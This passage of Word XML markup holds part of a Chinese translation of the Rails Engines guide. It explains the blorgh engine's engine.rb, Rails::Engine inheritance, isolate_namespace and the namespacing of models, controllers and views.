          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件（位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">）并且定义了一个名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的基础模块。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6BAF6F26" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B96E6E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require "blorgh/engine"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67242D7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71F00A8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module</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20D021D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4448058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有些 engine 选择这个文件为他们的 engine 放置全局配置选项。这是一个相当好的主意，并且如果你想提供（一些）配置选项，你的 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>module</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义所在的文件绝妙的主意。放置方法在模块中同样不赖。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A090EA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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中是 engine 的基础类：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="03FB6F58" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68839A6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module</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BC7E9D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class</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Engine &lt; Rails::Engine</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F62B75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isolate_namespace Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="691F92F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7B54EC5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5FEB3D3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By inheriting from the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> class, this gem notifies Rails that there’s an engine at the specified path, and will correctly mount the engine inside the application, performing tasks such as adding the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory of the engine to the load path for models, mailers, controllers and views. 通过继承至 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类，这个 gem 通知 Rails 在指定路径有一个 engine，并且正确的挂载这个 engine 到应用程序中，执行一些例如给 engine 添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来导入 models， mailers， controllers 和 views 之类的任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E97397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isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法值得特别注意。这个调用是相应隔离的 controllers， models， routes 以及其他到它们相应的名称空间，远离应用程序中相似的组件。如果没有它，这里可能会有 engine 组件泄漏到应用程序，引起未注意的干扰，或者很重要的一点 engine 组件可能会被应用程序中相似的名称的事物覆盖。冲突的一个例子是 helpers。没有调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>， engine 的 helper 将会被包含到应用程序的 controller 中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A83B08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NOTE： </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>强力推荐</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 engine 的类定义中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。没有它，被类所创建的 engine *可能*会与应用程序冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59188E1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这个 ‘isolation’ 的名称空间的意义是：一个被称之为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails g model</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的创建的 model比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails g model post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将不会被称为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，与之替代的是（加有名称空间的） </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这里的额外信息， ‘model’ 的 ‘table’ 也是被名称空间的，变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，而不是简单的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。于 ‘model’ 相似的名称空间化，一个叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 ‘controller’ 会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Postscontroller</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">并且这个 ‘controller’ 的视图将不在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，而是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。’Maillers’ 也会名称空间化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0F56F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最后， ‘route’ 也会被隔离在 engine 中。这是名称空间中最重要的一点，并且会在本教程随后的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId996" w:anchor="routes" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Routes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部分讨论它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D889A1F"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 xml:space="preserve">2.1.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8D874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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中标准会有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>controllers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>helpers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mailers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 以及 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录对其你会感到于一个应用程序很相似。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>helpers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mailers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录是空的因此这部分不做描述。我们会更多关注 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 后续部分，当我们编写 engine的时候。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8B9DD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 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
